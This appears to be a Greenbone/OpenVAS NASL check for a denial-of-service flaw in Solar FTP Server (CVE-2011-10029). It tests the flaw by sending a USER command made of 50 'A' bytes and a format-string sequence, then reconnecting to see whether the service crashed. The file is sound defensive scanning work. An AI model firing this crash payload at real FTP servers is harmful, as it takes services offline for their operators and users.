# SPDX-FileCopyrightText: 2011 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802001");
  script_version("2025-09-08T05:38:50+0000");
  script_tag(name:"last_modification", value:"2025-09-08 05:38:50 +0000 (Mon, 08 Sep 2025)");
  script_tag(name:"creation_date", value:"2011-03-04 14:32:35 +0100 (Fri, 04 Mar 2011)");
  script_tag(name:"cvss_base", value:"7.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:C");
  script_cve_id("CVE-2011-10029");
  script_name("SolarFTP USER Command Remote DoS Vulnerability");
  script_category(ACT_DENIAL);
  script_copyright("Copyright (C) 2011 Greenbone AG");
  script_family("FTP");
  script_dependencies("ftpserver_detect_type_nd_version.nasl");
  script_require_ports("Services/ftp", 21);
  script_mandatory_keys("ftp/solarftp/detected");

  script_xref(name:"URL", value:"http://web.archive.org/web/20111224164327/http://secunia.com/advisories/42834/");
  script_xref(name:"URL", value:"http://web.archive.org/web/20200229155536/http://www.securityfocus.com/bid/46504");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/16204");
  script_xref(name:"URL", value:"http://packetstormsecurity.org/files/view/98647/solarftp-dos.txt");
  script_xref(name:"URL", value:"https://www.vulncheck.com/advisories/solar-ftp-server-malformed-user-dos");

  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to cause a
  denial of service.");

  script_tag(name:"affected", value:"Flexbyte Software Solar FTP Server version 2.1.1 and prior.");

  script_tag(name:"insight", value:"The flaw is due to format string error while parsing 'USER'
  command, which can be exploited to crash the FTP service by sending 'USER'
  command with an overly long username parameter.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one.");

  script_tag(name:"summary", value:"SolarFTP Server is prone to a denial of service (DoS) vulnerability.");

  script_tag(name:"qod_type", value:"remote_analysis");
  script_tag(name:"solution_type", value:"WillNotFix");

  exit(0);
}

include("ftp_func.inc");
include("misc_func.inc");
include("port_service_func.inc");

ftpPort = ftp_get_port(default:21);
banner = ftp_get_banner(port:ftpPort);
if(!banner || "Solar FTP Server" >!< banner){
  exit(0);
}

soc = open_sock_tcp(ftpPort);
if(!soc) {
  exit(0);
}

resp = ftp_recv_line(socket:soc);
if(!resp || "Solar FTP Server" >!< resp){
  ftp_close(socket:soc);
  exit(0);
}

attackReq = crap(data: raw_string(0x41), length: 50) + '%x%lf%f%d%c%s%c%u%n%s%c%lf%tt%d%c';

attack = string("USER ", attackReq, "\r\n");
send(socket:soc, data:attack);
resp = recv_line(socket:soc, length:260);

ftp_close(socket:soc);

soc1 = open_sock_tcp(ftpPort);
if(!soc1) {
  security_message(port:ftpPort);
  exit(0);
}

resp = recv_line(socket:soc1, length:100);
ftp_close(socket:soc1);
if(!resp || "Solar FTP Server" >!< resp){
  security_message(port:ftpPort);
  exit(0);
}
